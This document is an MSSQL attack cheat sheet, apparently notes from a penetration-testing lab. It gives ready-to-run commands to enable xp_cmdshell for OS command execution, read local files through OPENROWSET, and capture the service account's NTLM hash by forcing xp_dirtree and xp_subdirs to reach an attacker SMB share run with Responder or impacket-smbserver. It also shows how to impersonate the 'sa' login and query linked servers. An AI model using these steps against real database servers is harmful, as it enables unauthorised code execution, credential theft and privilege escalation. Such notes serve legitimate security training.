## Connecting to DB

```sh
impacket-mssqlclient -p 1433 julio@10.129.203.7 
```

## Execute Commands

#### XP_CMDSHELL

- To execute commands using SQL syntax on MSSQL, use:

```sql
xp_cmdshell 'whoami'
```

- If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges

```sql
EXECUTE sp_configure 'show advanced options', 1
```

```sql
RECONFIGURE
```

```sql
EXECUTE sp_configure 'xp_cmdshell', 1
```

```sql
RECONFIGURE
```

## Read Local Files

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

GO
```

## Capture MSSQL Service Hash

- To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries

```sh
sudo impacket-smbserver share ./ -smb2support
```

OR

```sh
sudo responder -I tun0
```


```sql
EXEC master..xp_dirtree '\\YOUR_IP\share\'
GO
```

```sql
EXEC master..xp_subdirs '\\YOUR_IP\share\'
GO
```

## Impersonate Existing Users with MSSQL

- SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends 

#### Identify Users that We Can Impersonate

```sh
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

#### Verifying our Current User and Role

```sh
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

#### Impersonating the SA User

```sh
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

## Communicate with Other Databases with MSSQL

#### Identify linked Servers in **MSSQL**

```sql
1> SELECT srvname, isremote FROM sysservers
2> GO
```

- we can attempt to identify the user used for the connection and its privileges

```sql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

